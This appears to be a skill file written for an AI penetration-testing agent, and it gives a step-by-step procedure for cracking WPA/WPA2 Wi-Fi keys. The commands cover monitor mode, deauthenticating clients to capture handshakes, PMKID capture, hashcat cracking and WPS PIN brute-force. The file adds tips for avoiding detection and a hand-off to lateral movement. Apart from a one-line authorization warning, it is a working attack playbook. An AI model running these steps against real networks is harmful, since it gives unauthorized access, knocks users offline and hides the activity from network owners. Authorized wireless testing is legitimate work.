---
name: WPA/WPA2 Cracking
description: WPA/WPA2 handshake capture, PMKID attacks, and PSK cracking using airodump-ng, aircrack-ng, and hashcat
---

# WPA/WPA2 Cracking

Pull this skill when you are within wireless range of a WPA/WPA2-protected network and need to recover the Pre-Shared Key (PSK) to gain network access.

## Tool wiring

| Action | Tool | Notes |
|--------|------|-------|
| Monitor mode | `kali_shell` — `iwconfig`, `airmon-ng` | Enable RFMON on wireless interface |
| Packet capture | `kali_shell` — `airodump-ng` | Capture beacon + handshake frames |
| Deauth attack | `kali_shell` — `aireplay-ng` | Force client reauth to capture handshake |
| PMKID capture | `kali_shell` — `hcxdumptool` | Capture RSN PMKID from AP |
| Handshake conversion | `kali_shell` — `hcxpcapngtool`, `cap2hccapx` | Convert to hashcat format |
| PSK cracking | `kali_shell` — `aircrack-ng`, `hashcat` | Dictionary or brute-force |
| WPS attack | `kali_shell` — `reaver`, `bully`, `wash` | WPS PIN brute-force |

> **WARNING**: Wireless attacks may be illegal without explicit authorization. Ensure you have signed ROE covering wireless testing. Some cards (e.g., internal Intel AX-series) do not support monitor mode — use an external USB adapter (Alfa AWUS036ACH, Panda PAU09).

## Primer

WPA2-PSK uses a 4-way handshake between client and AP to derive session keys. The handshake itself does not reveal the PSK, but capturing it allows an offline dictionary attack. WPA3 and WPA2-Enterprise (802.1X) require different approaches.

## Workflow

### 1. Enable monitor mode
```bash
# Identify wireless interface
iwconfig

# Kill interfering processes and enable monitor mode
airmon-ng check kill
airmon-ng start wlan0
# Interface is now wlan0mon (or similar)
```

### 2. Discover target networks
```bash
# Scan for APs and clients
airodump-ng wlan0mon

# Look for:
#   BSSID — AP MAC
#   PWR — signal strength (higher is closer)
#   CH — channel
#   ENC — encryption type (WPA2 = targetable)
#   ESSID — network name
```

### 3a. Capture handshake (passive — wait for a client to connect)
```bash
# Lock onto the target channel + BSSID
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Wait for a 4-way handshake (appears in top-right of airodump display)
# File(s) written: capture-01.cap, .csv, .kismet.*
```

### 3b. Capture handshake (active — deauth to force reconnection)
```bash
# In terminal 1: capture on the target channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# In terminal 2: send deauth to a connected client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# Wait for handshake in terminal 1
```

### 3c. PMKID attack (no client required — only works on some APs)
```bash
# Capture PMKID from beacon (RSN IE)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Or use hcxpcapngtool after normal capture:
hcxpcapngtool -o capture.22000 capture.pcapng
# If PMKID is present, it will be in the .22000 file
```

### 4. Convert to hash format
```bash
# Convert .cap to hashcat format (.22000):
hcxpcapngtool -o capture.22000 capture-01.cap

# Verify the hash file has content and is in the right format:
wc -l capture.22000
head -1 capture.22000
```

### 5. Crack the PSK

#### With aircrack-ng (CPU, wordlist only):
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

#### With hashcat (GPU, wordlist + rules):
```bash
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt

# With rules (for mutation):
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked:
hashcat -m 22000 capture.22000 --show
```

### 6. (Alternative) WPS PIN attack
```bash
# Scan for WPS-enabled APs
wash -i wlan0mon

# Brute-force WPS PIN (takes 2-10 hours):
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Or use bully (more reliable with some APs):
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
```

## Attack matrix

| Technique | Client required? | Time | Success rate | Notes |
|-----------|-----------------|------|-------------|-------|
| Passive handshake | Yes | Minutes-hours | High | Depends on clients reconnecting naturally |
| Deauth handshake | Yes | Seconds | High | Fastest, most reliable |
| PMKID | No | Instant | Medium | Only on APs with RSN IE PMKID (many new routers) |
| WPS PIN | No | 2-10 hours | Medium | Lockout on many APs after 3-5 failed attempts |
| Dictionary crack | N/A | Minutes-days | Medium | Depends on password complexity |
| Rule-based crack | N/A | Hours-weeks | High | Mutates wordlist entries |

## Detection avoidance

| Signal | OPSEC note |
|--------|------------|
| Airodump scanning | Visible in AP logs as probe requests. Use short scans. |
| Deauth flood | Very noisy — clients disconnect and users will notice |
| Reaver WPS | ~1s per PIN attempt — slow but detectable |
| Monitor mode | Some wireless drivers show "monitor mode enabled" in kernel logs |

## Validation shape

A valid WPA crack finding should include:
- **Target AP**: BSSID, ESSID, channel, encryption type
- **Method**: Handshake captured (passive/deauth) or PMKID
- **PSK**: The recovered password (redacted for report)
- **Time to crack**: Duration + wordlist/rules used
- **Access achieved**: What internal resources were reachable after connecting

## False positives

- **Handshake file but no PSK crackable**: The password may not be in your wordlist. Try larger wordlists or rule-based attacks.
- **PMKID not present**: Only some APs include PMKID in the RSN IE. Not a vulnerability — just try handshake instead.
- **WPS locked**: After 3-5 failed PIN attempts, many APs enter a lockout period (30s-5min). Wait before retrying.
- **Fake handshakes**: Some tools generate artificial handshakes that look valid but crack to nothing. Verify with `aircrack-ng -c` or `tshark`.
- **No clients on target AP**: Cannot deauth without clients. Try PMKID attack or wait for a client to appear.

## Hand-off

- After cracking PSK and connecting to the network: `-> /skill network/pivoting_tunneling` for lateral movement
- For network scanning on the now-reachable LAN: `-> /skill tooling/nmap`
- For internal service discovery: `-> /skill tooling/httpx` or `-> /skill tooling/naabu`

## Pro tips

- **Use external USB adapter**: Internal laptop WiFi cards rarely support monitor mode. The Alfa AWUS036ACH (RTL8812AU) is the gold standard for Kali.
- **Deauth strategy**: Send only 1-3 deauth packets (not the default 5-10). Enough to trigger reauth but less likely to alert users.
- **Hashcat with GPU** is 1000x faster than aircrack-ng on CPU. If no GPU, use `--workload-profile 1` (low CPU impact) or run on a cloud instance with GPU.
- **PMKID is faster than handshake** — always try PMKID first (`hcxdumptool`) before deauth. It requires no client interaction and is virtually undetectable.
- **RockYou is not enough**: Supplement with `SecLists/Passwords/Common-Credentials`, `clearkey.txt`, and generate custom wordlists with `cewl` from the target's website.
